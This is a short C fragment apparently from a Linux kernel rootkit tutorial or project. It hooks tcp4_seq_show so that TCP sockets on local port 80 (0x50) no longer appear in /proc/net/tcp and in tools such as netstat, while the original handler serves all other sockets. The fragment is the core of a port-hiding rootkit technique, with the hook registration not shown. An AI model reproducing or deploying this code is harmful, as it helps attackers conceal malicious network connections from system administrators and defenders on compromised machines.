#include <linux/kallsyms.h>
#include <linux/tcp.h>

static asmlinkage long (*tcp4_seq_show)(struct seq_file *seq, void *v);

static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *socket = v;

    if (socket != 0x1 && socket->sk_num == 0x50)
        return 0;

    return tcp4_seq_show(seq, v);
}
